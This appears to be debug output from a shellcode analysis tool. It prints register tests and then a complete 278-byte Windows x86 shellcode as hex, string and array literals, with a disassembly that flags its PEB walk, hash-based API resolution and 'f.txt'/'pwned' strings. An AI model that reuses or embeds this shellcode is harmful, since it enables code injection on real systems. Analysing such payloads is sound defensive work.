
results:
00
40

Hexresults:
00000000

0040aabb

print ret432 eax:
0x0040aabb

[(0, 0, 0, 0, '0x00000000'), (0, 64, 170, 187, '0x0040aabb')]
0 64 170 187
ebx
[(0, 0, 0, 0, '0x00000000')]
(0, 0, 0, 0, '0x00000000')
eCx
[(0, 0, 0, 0, '0x00000000')]
(0, 0, 0, 0, '0x00000000')
(0, 0, 0, 0, '0x00000000')
0x0
before ebp
hi
(0, 0, 0, 0, '0x00000000')
0x0

***

after1 ebp
hi
(0, 0, 0, 68, '0x00000044')
0x44

add

after2
hi
(0, 0, 0, 68, '0x00000044')
0x44
(0, 0, 0, 0, '0x00000000')
[(0, 0, 0, 0, '0x00000000'), (0, 64, 170, 187, '0x0040aabb')]
[(0, 0, 0, 0, '0x00000000'), (0, 64, 170, 187, '0x0040aabb'), (0, 64, 171, 84, '0x0040ab54')]
***
[(0, 0, 0, 1, '0x00BB0001'), (0, 0, 0, 154, '0x0000009a')]
set reg***
(0, 0, 0, 0, '0x00000000')

new testing
(0, 64, 170, 187, '0x0040aabb')
0x40aabb
res 0xdd40aabb
(221, 64, 170, 187, '0xdd40aabb')
0xdd40aabb
('EAX', '41424344')
('EBX', '49492222')
('ECX', '00003333')
('EDX', '00004444')
('EDI', '00005555')
('ESI', '00006666')
('EBP', '00007777')
('ESP', '00008888')
0x49492222
0x41424344
ok
0x49492222
0x41424344
ok
EAX: 0x41424344
EBX: 0x49492222
ECX: 0x00003333
EDX: 0x00004444
ESI: 0x00006666
EDI: 0x00005555
EBP: 0x00007777
ESP: 0x00008888

0x41424344
bits True
#############################################################################
31C031C9648B71308B760C8B761C8B56088B7E208B3666394F1475F266B9016D6681E9946C66390F6689C175E189E5EB71608B6C24248B453C8B54057801EA8B4A188B5A2001EBE334498B348B01EE31FF31C0FCAC84C07407C1CF0D01C7EBF43B7C242875E18B5A2401EB668B0C4B8B5A1C01EB8B048B01E88944241C61C3AD5052E8AAFFFFFF89076681C40C016681EC04016681C708016681EF040139CE75DEC3EB105E8D7D0489F180C10CE8CDFFFFFFEB3BE8EBFFFFFF6E7C2EE11E3C3FD7741E48CD31D258885005EB2D31D259885101EB2C5150FF5504EB2A31D259885105EB2D515089C6FF550853FF550CE8D1FFFFFF662E7478744EE8CEFFFFFF774EE8CFFFFFFFE8D1FFFFFF70776E65644EE8CEFFFFFF
size shellArg 278
find peb
find peb res
OFFSETS: 
TIB = 0x4
LDR = 0x8
MODS = 0xb
Adv = ['0x14']

******************************************************************************


Item: 0 | Points: 4 | Module: rawHex


mov esi, dword ptr fs:[ecx + 0x30]				0x4 (offset 0x4)

mov esi, dword ptr [esi + 0xc]				0x8 (offset 0x8)

mov esi, dword ptr [esi + 0x1c]				0xb (offset 0xb)

mov edx, dword ptr [esi + 8]				0xe (offset 0xe)

mov edi, dword ptr [esi + 0x20]				0x11 (offset 0x11)

mov esi, dword ptr [esi]				0x14 (offset 0x14)



take bytes
FindStringsStatus True
***lenthShellBytes 278
printing final

0x0	xor eax, eax 
0x2	xor ecx, ecx 
0x4	mov esi, dword ptr fs:[ecx + 0x30]
0x8	mov esi, dword ptr [esi + 0xc]
0xb	mov esi, dword ptr [esi + 0x1c]
0xe	mov edx, dword ptr [esi + 8]
0x11	mov edi, dword ptr [esi + 0x20]
0x14	mov esi, dword ptr [esi] 
0x16	cmp word ptr [edi + 0x14], cx
0x1a	jne 0xe 
0x1c	mov cx, 0x6d01 
0x20	sub cx, 0x6c94 
0x25	cmp word ptr [edi], cx 
0x28	mov cx, ax 
0x2b	jne 0xe 
0x2d	mov ebp, esp 
0x2f	jmp 0xa2 
0x31	pushal 
0x32	mov ebp, dword ptr [esp + 0x24]
0x36	mov eax, dword ptr [ebp + 0x3c]
0x39	mov edx, dword ptr [ebp + eax
0x3d	add edx, ebp 
0x3f	mov ecx, dword ptr [edx + 0x18]
0x42	mov ebx, dword ptr [edx + 0x20]
0x45	add ebx, ebp 
0x47	jecxz 0x7d 
0x49	dec ecx 
0x4a	mov esi, dword ptr [ebx + ecx*4]
0x4d	add esi, ebp 
0x4f	xor edi, edi 
0x51	xor eax, eax 
0x53	cld 
0x54	lodsb al, byte ptr [esi] 
0x55	test al, al 
0x57	je 0x60 
0x59	ror edi, 0xd 
0x5c	add edi, eax 
0x5e	jmp 0x54 
0x60	cmp edi, dword ptr [esp + 0x28]
0x64	jne 0x47 
0x66	mov ebx, dword ptr [edx + 0x24]
0x69	add ebx, ebp 
0x6b	mov cx, word ptr [ebx + ecx*2]
0x6f	mov ebx, dword ptr [edx + 0x1c]
0x72	add ebx, ebp 
0x74	mov eax, dword ptr [ebx + ecx*4]
0x77	add eax, ebp 
0x79	mov dword ptr [esp + 0x1c], eax
0x7d	popal 
0x7e	ret 
0x7f	lodsd eax, dword ptr [esi] 
0x80	push eax 
0x81	push edx 
0x82	call 0x31 
0x87	mov dword ptr [edi], eax 
0x89	add sp, 0x10c 
0x8e	sub sp, 0x104 
0x93	add di, 0x108 
0x98	sub di, 0x104 
0x9d	cmp esi, ecx 
0x9f	jne 0x7f 
0xa1	ret 
0xa2	jmp 0xb4 
0xa4	pop esi 
0xa5	lea edi, [ebp + 4] 
0xa8	mov ecx, esi 
0xaa	add cl, 0xc 
0xad	call 0x7f 
0xb2	jmp 0xef 
0xb4	call 0xa4 
0xb9	outsb dx, byte ptr [esi] 
0xba	db 0x7c (!) 
0xbb	db 0x2e (!) 
0xbc	db 0xe1 (!) 
0xbd	db 0x1e (!) 
0xbe	db 0x3c (!) 
0xbf	db 0x3f (!) 
0xc0	db 0xd7 (!) 
0xc1	db 0x74 (!) 
0xc2	db 0x1e (!) 
0xc3	db 0x48 (!) 
0xc4	db 0xcd (!) 
0xc5	xor edx, edx 
0xc7	pop eax 
0xc8	mov byte ptr [eax + 5], dl
0xcb	jmp 0xfa 
0xcd	xor edx, edx 
0xcf	pop ecx 
0xd0	mov byte ptr [ecx + 1], dl
0xd3	jmp 0x101 
0xd5	push ecx 
0xd6	push eax 
0xd7	call dword ptr [ebp + 4] 
0xda	jmp 0x106 
0xdc	xor edx, edx 
0xde	pop ecx 
0xdf	mov byte ptr [ecx + 5], dl
0xe2	jmp 0x111 
0xe4	push ecx 
0xe5	push eax 
0xe6	mov esi, eax 
0xe8	call dword ptr [ebp + 8] 
0xeb	push ebx 
0xec	call dword ptr [ebp + 0xc] 
0xef	call 0xc5 
0xf4	f.txtN ; string 
0xfa	call 0xcd 
0xff	db 0x77 (!) 
0x100	db 0x4e (!) 
0x101	call 0xd5 
0x106	call 0xdc 
0x10b	pwnedN ; string 
0x111	call 0xe4 

String Literal:
"\x31\xc0\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x56\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x14\x75\xf2\x66\xb9\x01\x6d\x66\x81\xe9\x94\x6c\x66\x39\x0f\x66\x89\xc1\x75\xe1\x89\xe5\xeb\x71\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xad\x50\x52\xe8\xaa\xff\xff\xff\x89\x07\x66\x81\xc4\x0c\x01\x66\x81\xec\x04\x01\x66\x81\xc7\x08\x01\x66\x81\xef\x04\x01\x39\xce\x75\xde\xc3\xeb\x10\x5e\x8d\x7d\x04\x89\xf1\x80\xc1\x0c\xe8\xcd\xff\xff\xff\xeb\x3b\xe8\xeb\xff\xff\xff\x6e\x7c\x2e\xe1\x1e\x3c\x3f\xd7\x74\x1e\x48\xcd\x31\xd2\x58\x88\x50\x05\xeb\x2d\x31\xd2\x59\x88\x51\x01\xeb\x2c\x51\x50\xff\x55\x04\xeb\x2a\x31\xd2\x59\x88\x51\x05\xeb\x2d\x51\x50\x89\xc6\xff\x55\x08\x53\xff\x55\x0c\xe8\xd1\xff\xff\xff\x66\x2e\x74\x78\x74\x4e\xe8\xce\xff\xff\xff\x77\x4e\xe8\xcf\xff\xff\xff\xe8\xd1\xff\xff\xff\x70\x77\x6e\x65\x64\x4e\xe8\xce\xff\xff\xff"


Raw Hex:
"31c031c9648b71308b760c8b761c8b56088b7e208b3666394f1475f266b9016d6681e9946c66390f6689c175e189e5eb71608b6c24248b453c8b54057801ea8b4a188b5a2001ebe334498b348b01ee31ff31c0fcac84c07407c1cf0d01c7ebf43b7c242875e18b5a2401eb668b0c4b8b5a1c01eb8b048b01e88944241c61c3ad5052e8aaffffff89076681c40c016681ec04016681c708016681ef040139ce75dec3eb105e8d7d0489f180c10ce8cdffffffeb3be8ebffffff6e7c2ee11e3c3fd7741e48cd31d258885005eb2d31d259885101eb2c5150ff5504eb2a31d259885105eb2d515089c6ff550853ff550ce8d1ffffff662e7478744ee8ceffffff774ee8cfffffffe8d1ffffff70776e65644ee8ceffffff"


Array Literal:
{ 0x31, 0xc0, 0x31, 0xc9, 0x64, 0x8b, 0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b, 0x56, 0x08, 0x8b, 0x7e, 0x20, 0x8b, 0x36, 0x66, 0x39, 0x4f, 0x14, 0x75, 0xf2, 0x66, 0xb9, 0x01, 0x6d, 0x66, 0x81, 0xe9, 0x94, 0x6c, 0x66, 0x39, 0x0f, 0x66, 0x89, 0xc1, 0x75, 0xe1, 0x89, 0xe5, 0xeb, 0x71, 0x60, 0x8b, 0x6c, 0x24, 0x24, 0x8b, 0x45, 0x3c, 0x8b, 0x54, 0x05, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a, 0x20, 0x01, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c, 0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a, 0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a, 0x1c, 0x01, 0xeb, 0x8b, 0x04, 0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xad, 0x50, 0x52, 0xe8, 0xaa, 0xff, 0xff, 0xff, 0x89, 0x07, 0x66, 0x81, 0xc4, 0x0c, 0x01, 0x66, 0x81, 0xec, 0x04, 0x01, 0x66, 0x81, 0xc7, 0x08, 0x01, 0x66, 0x81, 0xef, 0x04, 0x01, 0x39, 0xce, 0x75, 0xde, 0xc3, 0xeb, 0x10, 0x5e, 0x8d, 0x7d, 0x04, 0x89, 0xf1, 0x80, 0xc1, 0x0c, 0xe8, 0xcd, 0xff, 0xff, 0xff, 0xeb, 0x3b, 0xe8, 0xeb, 0xff, 0xff, 0xff, 0x6e, 0x7c, 0x2e, 0xe1, 0x1e, 0x3c, 0x3f, 0xd7, 0x74, 0x1e, 0x48, 0xcd, 0x31, 0xd2, 0x58, 0x88, 0x50, 0x05, 0xeb, 0x2d, 0x31, 0xd2, 0x59, 0x88, 0x51, 0x01, 0xeb, 0x2c, 0x51, 0x50, 0xff, 0x55, 0x04, 0xeb, 0x2a, 0x31, 0xd2, 0x59, 0x88, 0x51, 0x05, 0xeb, 0x2d, 0x51, 0x50, 0x89, 0xc6, 0xff, 0x55, 0x08, 0x53, 0xff, 0x55, 0x0c, 0xe8, 0xd1, 0xff, 0xff, 0xff, 0x66, 0x2e, 0x74, 0x78, 0x74, 0x4e, 0xe8, 0xce, 0xff, 0xff, 0xff, 0x77, 0x4e, 0xe8, 0xcf, 0xff, 0xff, 0xff, 0xe8, 0xd1, 0xff, 0xff, 0xff, 0x70, 0x77, 0x6e, 0x65, 0x64, 0x4e, 0xe8, 0xce, 0xff, 0xff, 0xff }

b'1\xc01\xc9d\x8bq0\x8bv\x0c\x8bv\x1c\x8bV\x08\x8b~ \x8b6f9O\x14u\xf2f\xb9\x01mf\x81\xe9\x94lf9\x0ff\x89\xc1u\xe1\x89\xe5\xebq`\x8bl$$\x8bE<\x8bT\x05x\x01\xea\x8bJ\x18\x8bZ \x01\xeb\xe34I\x8b4\x8b\x01\xee1\xff1\xc0\xfc\xac\x84\xc0t\x07\xc1\xcf\r\x01\xc7\xeb\xf4;|$(u\xe1\x8bZ$\x01\xebf\x8b\x0cK\x8bZ\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89D$\x1ca\xc3\xadPR\xe8\xaa\xff\xff\xff\x89\x07f\x81\xc4\x0c\x01f\x81\xec\x04\x01f\x81\xc7\x08\x01f\x81\xef\x04\x019\xceu\xde\xc3\xeb\x10^\x8d}\x04\x89\xf1\x80\xc1\x0c\xe8\xcd\xff\xff\xff\xeb;\xe8\xeb\xff\xff\xffn|.\xe1\x1e<?\xd7t\x1eH\xcd1\xd2X\x88P\x05\xeb-1\xd2Y\x88Q\x01\xeb,QP\xffU\x04\xeb*1\xd2Y\x88Q\x05\xeb-QP\x89\xc6\xffU\x08S\xffU\x0c\xe8\xd1\xff\xff\xfff.txtN\xe8\xce\xff\xff\xffwN\xe8\xcf\xff\xff\xff\xe8\xd1\xff\xff\xffpwnedN\xe8\xce\xff\xff\xff'
before split

shellcode.txt
outputs\shellcode.bin
OFFSETS: 
TIB = 0x4
LDR = 0x8
MODS = 0xb
Adv = ['0x14']

******************************************************************************


Item: 0 | Points: 4 | Module: rawHex


mov esi, dword ptr fs:[ecx + 0x30]				0x4 (offset 0x4)

mov esi, dword ptr [esi + 0xc]				0x8 (offset 0x8)

mov esi, dword ptr [esi + 0x1c]				0xb (offset 0xb)

mov edx, dword ptr [esi + 8]				0xe (offset 0xe)

mov edi, dword ptr [esi + 0x20]				0x11 (offset 0x11)

mov esi, dword ptr [esi]				0x14 (offset 0x14)

db 0x66				0x16 (offset 0x16)



OFFSETS: 
TIB = 0x4
LDR = 0x8
MODS = 0xb
Adv = ['0x14']

******************************************************************************


Item: 1 | Points: 4 | Module: rawHex


mov esi, dword ptr fs:[ecx + 0x30]				0x4 (offset 0x4)

mov esi, dword ptr [esi + 0xc]				0x8 (offset 0x8)

mov esi, dword ptr [esi + 0x1c]				0xb (offset 0xb)

mov edx, dword ptr [esi + 8]				0xe (offset 0xe)

mov edi, dword ptr [esi + 0x20]				0x11 (offset 0x11)

mov esi, dword ptr [esi]				0x14 (offset 0x14)

db 0x66				0x16 (offset 0x16)



